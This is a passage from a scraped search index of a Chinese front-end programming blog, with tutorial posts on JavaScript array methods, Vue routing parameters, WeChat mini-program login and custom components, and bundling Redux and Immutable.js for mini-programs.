方法返回数组中满足提供的测试函数的第一个元素的值。否则返回 undefined。findIndex 方法返回数组中满足提供的测试函数的第一个元素的索引。否则返回-1 find 方法，当某个元素通过 callback 的测试时，返回数组中的一个值，否则返回 undefined。 findIndex方法，返回数组中满足提供的测试函数的第一个元素的索引。否则返回-1 12345678910111213141516171819// findlet a = [1, 4, -5, 10].find((n) =&gt; n &lt; 0); // 返回元素-5let b = [1, 4, -5, 10,NaN].find((n) =&gt; Object.is(NaN, n)); // 返回元素NaN// findIndexlet a = [1, 4, -5, 10].findIndex((n) =&gt; n &lt; 0); // 返回索引2let b = [1, 4, -5, 10,NaN].findIndex((n) =&gt; isNaN(n)); // 返回索引4// 稀疏数组let a =[1,,3,4];let index = 0;a.find((n) =&gt; &#123; console.log(index++) //0,1,2 第二次是empty也会调用一次，而且返回为true，立即退出 return n === 3;&#125;) 4.10 其他 keys()方法返回一个新的Array迭代器，它包含数组中每个索引的键 values() 方法返回一个新的Array迭代器，它包含数组中每个索引的值 entries()方法返回一个新的Array迭代器，该对象包含数组中每个索引的键/值对","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"https://ru23.com/tags/Javascript/"}]},{"title":"Javascript怎么设置和暂停stream流","slug":"2018-08-javascript怎么设置和暂停stream流","date":"2018-08-16T08:43:46.000Z","updated":"2018-10-24T03:46:02.550Z","comments":true,"path":"note/84de6d80.html","link":"","permalink":"https://ru23.com/note/84de6d80.html","excerpt":"","text":"1234567function stopStream() &#123; if (window.stream) &#123; window.stream.getTracks().forEach(function (track) &#123; track.stop(); &#125;); &#125;&#125; 1234function gotStream(stream) &#123; window.stream = stream; // make stream available to console videoElement.srcObject = stream;&#125;","categories":[{"name":"前端","slug":"前端","permalink":"https://ru23.com/categories/前端/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"https://ru23.com/tags/Javascript/"}]},{"title":"vue路由传参的三种基本方式","slug":"2018-08-vue路由传参的三种基本方式","date":"2018-08-15T10:31:11.000Z","updated":"2018-10-24T03:46:02.561Z","comments":true,"path":"note/701e9ca3.html","link":"","permalink":"https://ru23.com/note/701e9ca3.html","excerpt":"","text":"现有如下场景，点击父组件的li元素跳转到子组件中，并携带参数，便于子组件获取数据。父组件中： 1&lt;li v-for=\"article in articles\" @click=\"getDescribe(article.id)\"&gt; methods： 方案一：12345 getDescribe(id) &#123;// 直接调用$router.push 实现携带参数的跳转 this.$router.push(&#123; path: `/describe/$&#123;id&#125;`, &#125;) 方案一，需要对应路由配置如下：12345&#123; path: '/describe/:id', name: 'Describe', component: Describe&#125; 很显然，需要在path中添加/:id来对应 $router.push 中path携带的参数。在子组件中可以使用来获取传递的参数值。1$route.params.id 方案二：父组件中：通过路由属性中的name来确定匹配的路由，通过params来传递参数。123456this.$router.push(&#123; name: 'Describe', params: &#123; id: id &#125; &#125;) 对应路由配置: 注意这里不能使用:/id来传递参数了，因为父组件中，已经使用params来携带参数了。12345&#123; path: '/describe', name: 'Describe', component: Describe&#125; 子组件中: 这样来获取参数1$route.params.id 方案三：父组件：使用path来匹配路由，然后通过query来传递参数这种情况下 query传递的参数会显示在url后面?id=？123456this.$router.push(&#123; path: '/describe', query: &#123; id: id &#125; &#125;) 对应路由配置：12345&#123; path: '/describe', name: 'Describe', component: Describe&#125; 对应子组件: 这样来获取参数1$route.query.id 这里要特别注意 在子组件中 获取参数的时候是$route.params 而不是$router 这很重要~~~","categories":[{"name":"前端","slug":"前端","permalink":"https://ru23.com/categories/前端/"}],"tags":[{"name":"vue","slug":"vue","permalink":"https://ru23.com/tags/vue/"}]},{"title":"Immutable之回顾","slug":"2018-08-immutable-review","date":"2018-08-13T12:00:24.000Z","updated":"2018-10-24T03:46:02.546Z","comments":true,"path":"note/6c95af34.html","link":"","permalink":"https://ru23.com/note/6c95af34.html","excerpt":"","text":"一、Immutable几种数据结构 Immutable几种数据结构 二、fromJS fromJS 三、toJS toJS 四、Is Is 五、数据读取 数据读取 六、数据修改 数据修改 七、List中的各种删除与插入 List中的各种删除与插入 八、关于merge 关于merge","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"Immutable","slug":"Immutable","permalink":"https://ru23.com/tags/Immutable/"}]},{"title":"小程序之登录","slug":"2018-08-wx-login","date":"2018-08-12T16:01:20.000Z","updated":"2018-10-24T03:46:02.565Z","comments":true,"path":"note/b106285.html","link":"","permalink":"https://ru23.com/note/b106285.html","excerpt":"","text":"一、登录流程 小程序内通过wx.login接口获得code 将code传入后台，后台对微信服务器发起一个https请求换取openid、session_key(解密encryptedData、iv得到的) 后台生成一个自身的3rd_session（以此为key值保持openid和session_key），返回给前端。PS:微信方的openid和session_key并没有发回给前端小程序 小程序拿到3rd_session之后保持在本地 小程序请求登录区内接口，通过wx.checkSession检查登录态，如果失效重新走上述登录流程，否则待上3rd_session到后台进行登录验证 通过上面wx.login和wx.getUserInfo两个api拿到相应的信息,并通过上方接口传给自己的服务器. 登录获取用户信息 1234567wx.login(&#123; success(res)&#123; console.log(res) //code:\"fda41033Z0fdak3dfae01dffaaWXQA1vwQ4dfae0Akg3e0Z0k3E\" //errMsg:\"login:ok\" &#125;&#125;) 12345wx.getUserInfo(&#123; success(res)&#123; console.log(res) &#125; &#125;) 返回的信息 userInfo 需要传输的信息有7个参数 1234567891011appid 小程序唯一标识secret 小程序的 app secretjs_code //wx.login登录时获取的 code,用于后续获取session_key//下面两个参数用户服务器端签名校验用户信息的signature 使用 sha1( rawData + sessionkey ) 得到字符串，用于校验用户信息。rawData 不包括敏感信息的原始数据字符串，用于计算签名。//下面两个参数是用于解密获取openId和UnionId的encryptedData 包括敏感数据在内的完整用户信息的加密数据iv 加密算法的初始向量 可精简为以下三个参数. 其余的签名校验的参数可省略,而appid和secret可以直接写在服务器. 123js_code // wx.login登录时获取的 code,用于后续获取session_keyencryptedData 包括敏感数据在内的完整用户信息的加密数据iv 加密算法的初始向量 服务端处理返回token、sessionId过程省略… 二、登录态校验 主要用到checkSession 1234567891011121314151617181920212223242526272829303132333435363738wx.checkSession(&#123; success: (res) =&gt; &#123; console.log('warning wx.checkSession OK, but no viewerId', res); &#125;, fail: (res) =&gt; &#123; console.log('wx.checkSession failed:', res); &#125;, complete: () =&gt; &#123; wx.login(&#123; success: (res) =&gt; &#123; console.log('wx.login success:', res); // 登录自有系统 API.login.wechat(&#123; js_code: res.code &#125;, d =&gt; &#123; console.log('private login response:', d); if (d.code === 0) &#123; console.log('private login success:', d); let viewerId = d.data.user.user_id; _m.globalData.viewerId = viewerId; wx.setStorageSync('user_id', viewerId); callback &amp;&amp; callback(); &#125; else &#123; console.error('get user_id error'); &#125; &#125;, &#123; ignoreError: true &#125;); &#125;, fail: (res) =&gt; &#123; console.log('wx.login failed:', res); &#125; &#125;); &#125;&#125;); 三、完整登录代码示例123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191const CONFIG = require('./config.js')App(&#123; globalData:&#123; viewerId:null, userInfo:null &#125;, onLaunch()&#123; // 注册当前用户 this.register() &#125;, login: function(callback) &#123; let _m = this // 开发环境重复使用就好 if (!viewerId &amp;&amp; CONFIG.IS_DEBUG) &#123; viewerId = wx.getStorageSync('user_id'); &#125; // 先检查是否有登录态，且获取过用户数据；否则触发一次登录 if (viewerId) &#123; _m.globalData.viewerId = viewerId; callback &amp;&amp; callback(); &#125; else &#123; wx.checkSession(&#123; success: (res) =&gt; &#123; console.log('warning wx.checkSession OK, but no viewerId', res); &#125;, fail: (res) =&gt; &#123; console.log('wx.checkSession failed:', res); &#125;, complete: () =&gt; &#123; wx.login(&#123; success: (res) =&gt; &#123; console.log('wx.login success:', res); // 登录自有系统 API.login.wechat(&#123; js_code: res.code &#125;, d =&gt; &#123; console.log('private login response:', d); if (d.code === 0) &#123; console.log('private login success:', d); let viewerId = d.data.user.user_id; _m.globalData.viewerId = viewerId; wx.setStorageSync('user_id', viewerId); callback &amp;&amp; callback(); &#125; else &#123; console.error('get user_id error'); &#125; &#125;, &#123; ignoreError: true &#125;); &#125;, fail: (res) =&gt; &#123; console.log('wx.login failed:', res); &#125; &#125;); &#125; &#125;); &#125; &#125;, register: function(needTry, callback)&#123; !callback &amp;&amp; (callback = function()&#123;&#125;); this.login(()=&gt;&#123; // 如果曾经授权过，则不用再请求了 /*try &#123; let registedTime = wx.getStorageSync('REGISTED.'+ this.globalData.viewerId); // 7天内授权过的不再请求，不再更新资料 if (registedTime &amp;&amp; ((new Date).getTime()-registedTime) &lt; 604800000) &#123; callback(); return; &#125; &#125; catch (e) &#123;&#125;*/ wx.getUserInfo(&#123; success: (res) =&gt; &#123; let params = &#123;&#125;; this.globalData.userInfo = res.userInfo; params.owner = &#123; id: this.globalData.viewerId, connected_profile: &#123; nickname : res.userInfo.nickName||'', // 用户昵称 profile_pic_url: res.userInfo.avatarUrl||'', // 头像， avatarUrl language : res.userInfo.language||'', // 语言, \"zh_TW\" gender : res.userInfo.gender, geo: &#123; country : res.userInfo.country, province: res.userInfo.province, city : res.userInfo.city &#125; &#125; &#125; API.profile.update(params, (d) =&gt; &#123; // 静默注册 if(d.code === 0) &#123; try &#123; wx.setStorageSync('USERINFO.'+ this.globalData.viewerId, this.globalData.userInfo); wx.setStorageSync('REGISTED.'+ this.globalData.viewerId, (new Date).getTime()); &#125; catch (e) &#123;&#125; callback(); &#125; &#125;, &#123; ignoreError: true &#125;); &#125;, fail: () =&gt; &#123; console.log('get user info failed: not authorized.', arguments); // 强制弹一次授权 if (needTry) &#123; wx.openSetting(&#123; success: (res)=&gt; &#123; if (res.authSetting['scope.userInfo']) &#123; wx.showToast(&#123; title: LANG.AuthorizeSuccess, duration: CONFIG.SHOWTOAST_DURATION, &#125;); &#125; &#125;, fail: (res)=&gt; &#123; console.log('user not permit to authorize.', arguments); &#125; &#125;); &#125; &#125;, withCredentials: false // 不包含openid 等敏感信息 &#125;); &#125;); &#125;, init: function(callback) &#123; this.login(()=&gt;&#123; // 塞入常规环境数据 let pageInstance = this.getCurrentPageInstance(), context, screenWidth, screenHeight; /*if (this.globalData.device.system_info) &#123; screenWidth = this.globalData.device.system_info.screen_width; screenHeight = this.globalData.device.system_info.screen_height; &#125; else &#123; let systemInfo = wx.getSystemInfoSync(); if (systemInfo) &#123; screenWidth = systemInfo.screenWidth; screenHeight = systemInfo.screenHeight; &#125; &#125;*/ context = &#123; LANG : LANG, CDN : CONFIG.CDN_HOST, isNoContent : false, HashtagType : CONFIG.HashtagType, VerbType : CONFIG.VerbType, GridImageWidthMode : CONFIG.GridImageWidthMode, STICKER_MAKER_ENABLED: CONFIG.STICKER_MAKER_ENABLED, UGC_ENABLED : CONFIG.UGC_ENABLED, UGC_IMAGE_COUNT_LIMIT: CONFIG.UGC_IMAGE_COUNT_LIMIT, ReviewStateText : CONFIG.ReviewStateText, networkType : this.globalData.device.network ? this.globalData.device.network.network_type : NetworkType.UNKNOWN, IS_DEV : CONFIG.IS_DEV, IS_SHOW_CONSOLE : CONFIG.IS_SHOW_CONSOLE, DEBUG_DATA : [], // 全部配置都放开读 CONFIG : CONFIG, videoPlayStatus : &#123;&#125;, CURRENT_PAGE : pageInstance.data.PAGE, hideVideo : false, // 因为小程序中video不能被任何元素遮挡，所以增加此变量，用于一些浮层展示时，隐藏视频 updated_time : (new Date).getTime() // 页面上次更新时间 &#125;; pageInstance.setData(&#123; context: context &#125;); this.sendLaunchEvent(); callback &amp;&amp; callback(); &#125;) &#125;&#125;)","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"小程序","slug":"小程序","permalink":"https://ru23.com/tags/小程序/"}]},{"title":"小程序之自定义组件","slug":"2018-08-wx-component","date":"2018-08-12T15:43:20.000Z","updated":"2018-10-24T03:46:02.563Z","comments":true,"path":"note/356b2ea3.html","link":"","permalink":"https://ru23.com/note/356b2ea3.html","excerpt":"","text":"一、创建自定义组件 类似于页面，一个自定义组件由 json wxml wxss js 4个文件组成。要编写一个自定义组件，首先需要在 json 文件中进行自定义组件声明（将 component 字段设为 true 可这一组文件设为自定义组件） 123&#123; &quot;component&quot;: true&#125; 二、使用自定义组件 使用已注册的自定义组件前，首先要在页面的 json 文件中进行引用声明。此时需要提供每个自定义组件的标签名和对应的自定义组件文件路径 12345&#123; \"usingComponents\": &#123; \"component-tag-name\": \"path/to/the/custom/component\" &#125;&#125; 这样，在页面的 wxml 中就可以像使用基础组件一样使用自定义组件。节点名即自定义组件的标签名，节点属性即传递给组件的属性值。 1234&lt;view&gt; &lt;!-- 以下是对一个自定义组件的引用 --&gt; &lt;component-tag-name inner-text=&quot;Some text&quot;&gt;&lt;/component-tag-name&gt;&lt;/view&gt; 三、组件模版 在组件模板中可以提供一个 &lt;slot&gt;节点，用于承载组件引用时提供的子节点 12345&lt;!-- 组件模板 --&gt;&lt;view class=\"wrapper\"&gt; &lt;view&gt;这里是组件的内部节点&lt;/view&gt; &lt;slot&gt;&lt;/slot&gt;&lt;/view&gt; 1234567&lt;!-- 引用组件的页面模版 --&gt;&lt;view&gt; &lt;component-tag-name&gt; &lt;!-- 这部分内容将被放置在组件 &lt;slot&gt; 的位置上 --&gt; &lt;view&gt;这里是插入到组件slot中的内容&lt;/view&gt; &lt;/component-tag-name&gt;&lt;/view&gt; 模版数据绑定 可以使用数据绑定，这样就可以向子组件的属性传递动态数据 1234567&lt;!-- 引用组件的页面模版 --&gt;&lt;view&gt; &lt;component-tag-name prop-a=\"&#123;&#123;dataFieldA&#125;&#125;\" prop-b=\"&#123;&#123;dataFieldB&#125;&#125;\"&gt; &lt;!-- 这部分内容将被放置在组件 &lt;slot&gt; 的位置上 --&gt; &lt;view&gt;这里是插入到组件slot中的内容&lt;/view&gt; &lt;/component-tag-name&gt;&lt;/view&gt; 组件wxml的slot 在组件的wxml中可以包含 slot 节点，用于承载组件使用者提供的wxml结构。 默认情况下，一个组件的wxml中只能有一个slot。需要使用多slot时，可以在组件js中声明启用 1234567Component(&#123; options: &#123; multipleSlots: true // 在组件定义时的选项中启用多slot支持 &#125;, properties: &#123; /* ... */ &#125;, methods: &#123; /* ... */ &#125;&#125;) 此时，可以在这个组件的wxml中使用多个slot，以不同的 name 来区分 123456&lt;!-- 组件模板 --&gt;&lt;view class=\"wrapper\"&gt; &lt;slot name=\"before\"&gt;&lt;/slot&gt; &lt;view&gt;这里是组件的内部细节&lt;/view&gt; &lt;slot name=\"after\"&gt;&lt;/slot&gt;&lt;/view&gt; 使用时，用 slot 属性来将节点插入到不同的slot上 123456789&lt;!-- 引用组件的页面模版 --&gt;&lt;view&gt; &lt;component-tag-name&gt; &lt;!-- 这部分内容将被放置在组件 &lt;slot name=\"before\"&gt; 的位置上 --&gt; &lt;view slot=\"before\"&gt;这里是插入到组件slot name=\"before\"中的内容&lt;/view&gt; &lt;!-- 这部分内容将被放置在组件 &lt;slot name=\"after\"&gt; 的位置上 --&gt; &lt;view slot=\"after\"&gt;这里是插入到组件slot name=\"after\"中的内容&lt;/view&gt; &lt;/component-tag-name&gt;&lt;/view&gt; 四、Component构造器 Component构造器可用于定义组件，调用Component构造器时可以指定组件的属性、数据、方法等 1234567891011121314151617181920212223242526272829303132333435363738394041Component(&#123; behaviors: [], properties: &#123; myProperty: &#123; // 属性名 type: String, // 类型（必填），目前接受的类型包括：String, Number, Boolean, Object, Array, null（表示任意类型） value: '', // 属性初始值（可选），如果未指定则会根据类型选择一个 observer: function(newVal, oldVal, changedPath) &#123; // 属性被改变时执行的函数（可选），也可以写成在methods段中定义的方法名字符串, 如：'_propertyChange' // 通常 newVal 就是新设置的数据， oldVal 是旧数据 &#125; &#125;, myProperty2: String // 简化的定义方式 &#125;, data: &#123;&#125;, // 私有数据，可用于模版渲染 // 生命周期函数，可以为函数，或一个在methods段中定义的方法名 attached: function()&#123;&#125;, moved: function()&#123;&#125;, detached: function()&#123;&#125;, methods: &#123; onMyButtonTap: function()&#123; this.setData(&#123; // 更新属性和数据的方法与更新页面数据的方法类似 &#125;) &#125;, // 内部方法建议以下划线开头 _myPrivateMethod: function()&#123; // 这里将 data.A[0].B 设为 'myPrivateData' this.setData(&#123; 'A[0].B': 'myPrivateData' &#125;) &#125;, _propertyChange: function(newVal, oldVal) &#123; &#125; &#125;&#125;) 在 properties 定义段中，属性名采用驼峰写法（propertyName）； 在 wxml 中，指定属性值时则对应使用连字符写法（component-tag-name property-name=&quot;attr value&quot;），应用于数据绑定时采用驼峰写法（attr=&quot;&quot;） 五、组件间通信与事件组件间通信 组件间的基本通信方式有以下几种。 WXML 数据绑定：用于父组件向子组件的指定属性设置数据 事件：用于子组件向父组件传递数据，可以传递任意数据。 如果以上两种方式不足以满足需要，父组件还可以通过 this.selectComponent 方法获取子组件实例对象，这样就可以直接访问组件的任意数据和方法 监听事件 自定义组件可以触发任意的事件，引用组件的页面可以监听这些事件 监听自定义组件事件的方法与监听基础组件事件的方法完全一致 1234&lt;!-- 当自定义组件触发“myevent”事件时，调用“onMyEvent”方法 --&gt;&lt;component-tag-name bindmyevent=\"onMyEvent\" /&gt;&lt;!-- 或者可以写成 --&gt;&lt;component-tag-name bind:myevent=\"onMyEvent\" /&gt; 12345Page(&#123; onMyEvent: function(e)&#123; e.detail // 自定义组件触发事件时提供的detail对象 &#125;&#125;) 触发事件 自定义组件触发事件时，需要使用 triggerEvent 方法，指定事件名、detail对象和事件选项 12&lt;!-- 在自定义组件中 --&gt;&lt;button bindtap=\"onTap\"&gt;点击这个按钮将触发“myevent”事件&lt;/button&gt; 12345678910Component(&#123; properties: &#123;&#125; methods: &#123; onTap: function()&#123; var myEventDetail = &#123;&#125; // detail对象，提供给事件监听函数 var myEventOption = &#123;&#125; // 触发事件的选项 this.triggerEvent('myevent', myEventDetail, myEventOption) &#125; &#125;&#125;) 六、自定义组件案例 实现一个弹框 在component下新建popup文件夹 popup.wxml 12345678910&lt;view class=\"wx-popup\" hidden=\"&#123;&#123;flag&#125;&#125;\"&gt; &lt;view class='popup-container'&gt; &lt;view class=\"wx-popup-title\"&gt;&#123;&#123;title&#125;&#125;&lt;/view&gt; &lt;view class=\"wx-popup-con\"&gt;&#123;&#123;content&#125;&#125;&lt;/view&gt; &lt;view class=\"wx-popup-btn\"&gt; &lt;text class=\"btn-no\" bindtap='_error'&gt;&#123;&#123;btn_no&#125;&#125;&lt;/text&gt; &lt;text class=\"btn-ok\" bindtap='_success'&gt;&#123;&#123;btn_ok&#125;&#125;&lt;/text&gt; &lt;/view&gt; &lt;/view&gt;&lt;/view&gt; popup.js 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566Component(&#123; options: &#123; multipleSlots: true // 在组件定义时的选项中启用多slot支持 &#125;, /** * 组件的属性列表 */ properties: &#123; title: &#123; // 属性名 type: String, // 类型（必填），目前接受的类型包括：String, Number, Boolean, Object, Array, null（表示任意类型） value: '标题' // 属性初始值（可选），如果未指定则会根据类型选择一个 &#125;, // 弹窗内容 content: &#123; type: String, value: '内容' &#125;, // 弹窗取消按钮文字 btn_no: &#123; type: String, value: '取消' &#125;, // 弹窗确认按钮文字 btn_ok: &#123; type: String, value: '确定' &#125; &#125;, /** * 组件的初始数据 */ data: &#123; flag: true, &#125;, /** * 组件的方法列表 */ methods: &#123; //隐藏弹框 hidePopup: function () &#123; this.setData(&#123; flag: !this.data.flag &#125;) &#125;, //展示弹框 showPopup () &#123; this.setData(&#123; flag: !this.data.flag &#125;) &#125;, /* * 内部私有方法建议以下划线开头 * triggerEvent 用于触发事件 */ _error () &#123; //触发取消回调 this.triggerEvent(\"error\") &#125;, _success () &#123; //触发成功回调 this.triggerEvent(\"success\"); &#125; &#125;&#125;) 在首页用这个组件需要配置一下，首先建一个名为index.json的文件，里边配置”usingComponents”，就是需要引入到首页 12345&#123; \"usingComponents\": &#123; \"popup\": \"/component/popup/popup\" &#125;&#125; 引入到首页 1234567891011121314&lt;!--index.wxml--&gt;&lt;view class=\"container\"&gt; &lt;view class=\"userinfo\"&gt; &lt;button bindtap=\"showPopup\"&gt; 点我 &lt;/button&gt; &lt;/view&gt; &lt;popup id='popup' title='小组件' content='学会了吗' btn_no='没有' btn_ok='学会了' bind:error=\"_error\" bind:success=\"_success\"&gt; &lt;/popup&gt;&lt;/view&gt; 配置index.js操作点击事件 12345678910111213141516171819202122232425//index.js//获取应用实例const app = getApp() Page(&#123; onReady: function () &#123; //获得popup组件 this.popup = this.selectComponent(\"#popup\"); &#125;, showPopup() &#123; this.popup.showPopup(); &#125;, //取消事件 _error() &#123; console.log('你点击了取消'); this.popup.hidePopup(); &#125;, //确认事件 _success() &#123; console.log('你点击了确定'); this.popup.hidePopup(); &#125;&#125;)","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"小程序","slug":"小程序","permalink":"https://ru23.com/tags/小程序/"}]},{"title":"业务中处理数据结构常用的JS方法","slug":"2018-08-js-map-reduce-find-filter","date":"2018-08-12T11:11:43.000Z","updated":"2018-10-24T03:46:02.551Z","comments":true,"path":"note/e40c7b5c.html","link":"","permalink":"https://ru23.com/note/e40c7b5c.html","excerpt":"","text":"一、由map、filter、reduce、find展开filter filter方法可以筛除数组和类似结构中不满足条件的元素，并返回满足条件的元素组成的数组。 123const integers = [1, 2, 3, 4, 6, 7];const evenIntegers = integers.filter(i =&gt; i%2 === 0);// evenIntegers的值为[2, 4, 6] find find返回数组或类似结构中满足条件的第一个元素 123456const posts = [ &#123;id: 1, title: 'Title 1'&#125;, &#123;id: 2, title: 'Title 2'&#125;];// 找出id为1的postsconst title = posts.find(p =&gt; p.id === 1).title; map map方法的作用在于处理流式数据，比如数组。我们可以把它想象成所有元素都要经过的一个转换器。 123const integers = [1, 2, 3, 4, 6, 7];const twoXIntegers = integers.map(i =&gt; i*2);// twoXIntegers现在是 [2, 4, 6, 8, 12, 14]，而integers不发生变化。 reduce 当你想要将多个数据放进一个实例中时，你可以使用一个reducer 12345678910const posts = [ &#123;id: 1, upVotes: 2&#125;, &#123;id: 2, upVotes: 89&#125;, &#123;id: 3, upVotes: 1&#125;];const totalUpvotes = posts.reduce((totalUpvotes, currentPost) =&gt; totalUpvotes + currentPost.upVotes, //reducer函数 0 // 初始化投票数为0);console.log(totalUpvotes)//输出投票总数：92 传给reduce的第一个参数函数还可以增加2个参数： 第三个参数：每个元素在原数据结构中的位置，比如数组下标。 第四个参数：调用reduce方法的数据集合，比如例子中的posts some some找到数组中符合条件的一项就不会在找，类似于find只找第一项 1[1,2,3,4,5].some(v=&gt;v&gt;4) // true 符合有某一项满足条件 every every数组中每个条件都为真才会返回真 1[1,2,3,4,5].every(v=&gt;v&gt;1) // false 数组中每一项都大于1才会返回true 二、向对象数组添加新元素1234const books = [];const newBook = &#123;title: 'Alice in wonderland', id: 1&#125;;const updatedBooks = [...books, newBook];//updatedBooks的值为[&#123;title: 'Alice in wonderland', id: 1&#125;] 三、为一个数组创建视图 如果需要实现用户从购物车中删除物品，但是又不想破坏原来的购物车列表，可以使用filter方法 1234const myId = 6;const userIds = [1, 5, 7, 3, 6];const allButMe = userIds.filter(id =&gt; id !== myId);// allButMe is [1, 5, 7, 3] 四、向数组中新增元素123const books = ['Positioning by Trout', 'War by Green'];const newBooks = [...books, 'HWFIF by Carnegie'];// newBooks are now ['Positioning by Trout', 'War by Green', 'HWFIF // by Carnegie'] 五、为对象新增一组键值对123const user = &#123;name: 'Shivek Khurana'&#125;;const updatedUser = &#123;...user, age: 23&#125;;//updatedUser的值为：&#123;name: 'Shivek Khurana', age: 23&#125; 六、使用变量作为键名为对象添加键值对1234const dynamicKey = 'wearsSpectacles';const user = &#123;name: 'Shivek Khurana'&#125;;const updatedUser = &#123;...user, [dynamicKey]: true&#125;;// updatedUser is &#123;name: 'Shivek Khurana', wearsSpectacles: true&#125; 七、修改数组中满足条件的元素对象1234567891011121314const posts = [ &#123;id: 1, title: 'Title 1'&#125;, &#123;id: 2, title: 'Title 2'&#125;];const updatedPosts = posts.map(p =&gt; p.id !== 1 ? p : &#123;...p, title: 'Updated Title 1'&#125;);/*updatedPosts is now [ &#123;id: 1, title: 'Updated Title 1'&#125;, &#123;id: 2, title: 'Title 2'&#125;];*/ 八、找出数组中满足条件的元素123456const posts = [ &#123;id: 1, title: 'Title 1'&#125;, &#123;id: 2, title: 'Title 2'&#125;];const postInQuestion = posts.find(p =&gt; p.id === 2);// postInQuestion now holds &#123;id: 2, title: 'Title 2'&#125; 九、删除目标对象的一组属性12345678910111213141516//方法一const user = &#123;name: 'Shivek Khurana', age: 23, password: 'SantaCl@use'&#125;;const userWithoutPassword = Object.keys(user) .filter(key =&gt; key !== 'password') .map(key =&gt; &#123;[key]: user[key]&#125;) .reduce((accumulator, current) =&gt; (&#123;...accumulator, ...current&#125;), &#123;&#125; );// 方法二const user = &#123;name: 'Shivek Khurana', age: 23, password: 'SantaCl@use'&#125;;const userWithoutPassword = ((&#123;name, age&#125;) =&gt; (&#123;name, age&#125;))(user);// userWithoutPassword becomes &#123;name: 'Shivek Khurana', age: 23&#125; 十、将对象转化成请求串123456789const params = &#123;color: 'red', minPrice: 8000, maxPrice: 10000&#125;;const query = '?' + Object.keys(params) .map(k =&gt; encodeURIComponent(k) + '=' + encodeURIComponent(params[k]) ) .join('&amp;');// encodeURIComponent将对特殊字符进行编码。// query is now \"color=red&amp;minPrice=8000&amp;maxPrice=10000\" 十一、获取数组中某一对象的下标12345678const posts = [ &#123;id: 13, title: 'Title 221'&#125;, &#123;id: 5, title: 'Title 102'&#125;, &#123;id: 131, title: 'Title 18'&#125;, &#123;id: 55, title: 'Title 234'&#125;];// 找到id为131的元素const requiredIndex = posts.findIndex(obj=&gt;obj.id===131);","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://ru23.com/tags/JavaScript/"},{"name":"API","slug":"API","permalink":"https://ru23.com/tags/API/"}]},{"title":"在小程序中集成redux/immutable/thunk第三方库","slug":"2018-08-wx-redux","date":"2018-08-11T05:30:43.000Z","updated":"2018-10-24T03:46:02.567Z","comments":true,"path":"note/110e7213.html","link":"","permalink":"https://ru23.com/note/110e7213.html","excerpt":"","text":"一、前言 小程序给我们暴露了两个参数require和module，require用来在模块中加载其他模块，module用来将模块中的方法暴露出去 1module.exports = function()&#123;&#125; 所以只要需要让第三方库的代码使用这种形式的export就可以了 二、构建Redux的微信小程序包 打一个Redux包，让它可以兼容微信小城的加载方式 1234567git clone https://github.com/reactjs/redux.gitnpm install# 详细内容可以到redux项目的package.json中查看# 这些命令是是使用webpack构建UMD模式的包。也就是说所有的代码，包括依赖的库都会被打包到一个文件中，并且自带一段模块加载代码，文件可以在dist目录下找到npm run build:umd &amp;&amp; npm run build:umd 用编辑器打开dist目录下的redux.js文件 123456789101112(function webpackUniversalModuleDefinition(root, factory) &#123; if(typeof exports === 'object' &amp;&amp; typeof module === 'object') module.exports = factory(); else if(typeof define === 'function' &amp;&amp; define.amd) define([], factory); else if(typeof exports === 'object') exports[\"Redux\"] = factory(); else root[\"Redux\"] = factory();&#125;)(this, function() &#123;... &#125;) 这段代码是用来加载模块的，里面的factory函数的返回的内容是用webpack提供的loader组织起来的redux的代码和第三方依赖。 如果我们把这个文件拷贝到小程序中，只需要让程序能正常进入第三行代码，就能把Redux加载进来 将第二行代码：if(typeof exports === &#39;object&#39; &amp;&amp; typeof module === &#39;object&#39;) 修改成：if(typeof module === &#39;object&#39;) 这样修改的原因是，在微信小程序的环境中是没有exports变量的，所以就没办法正确进入这个分支，删除之后就可以正确进入 我们拷贝到libs目录下，那么我们在程序中使用时，只要当做是一个本地模块去require就可以了 var redux = require(&#39;./libs/redux.js&#39;) 我们可以通过类似的方法，使用Webpack打包第三方库，就可以集成任何库了 三、集成Redux-devtools 因为微信小程序的开发环境是定制的，暂时没有发现办法直接安装redux-devtool的插件 安装remote-redux-devtools 原版的remote-redux-devtools使用的一个websocket的依赖会使用原生的WebSocket，小程序是不支持的，所以需要改成小程序的websocket实现,修改好的代码 https://github.com/poetries/wx-redux-immutable-template/blob/master/wx-redux-immutable-template/public/libs/remote-redux-devtools.js 把代码下载到工程目录里面就可以用了 安装和启动remotedev-server 12npm install -g remotedev-serverremotedev --hostname=localhost --port=5678 因为没办法用npm安装到本地（微信小程序会尝试去加载项目目录中的所有js），所以这里使用全局安装，第二条命令是启动remotedev-server，hostname和port分别指定为localhost和5678 集成devtool 在store下集成devtool 12345678910111213const &#123;createStore, compose&#125; = require('./libs/redux.js');const devTools = require('./libs/remote-redux-devtools.js').default;const reducer = require('./reducers/index.js')function configureStore() &#123; return createStore(reducer, compose(devTools(&#123; hostname: 'localhost', port: 5678, secure: false &#125;)));&#125;module.exports = configureStore; 把devtool使用redux的compose加到store中去。hostname和port是指定为之前启动remotedev-server启动时候指定的参数。保存之后重启一下小程序，如果没有报错的话就OK了 可以在浏览器中访问localhost:5678 四、小程序中集成immutable Immutable 是 Facebook 开发的不可变数据集合。不可变数据一旦创建就不能被修改，是的应用开发更简单，允许使用函数式编程技术，比如惰性评估。微信小程序无法直接使用Immutable.js，下面就来说说微信小程序如何使用第三方库Immutable.js Immutable使用了UMD模块化规范 123456789(function (global, factory) &#123; typeof exports === 'object' &amp;&amp; typeof module !== 'undefined' ? module.exports = factory() : typeof define === 'function' 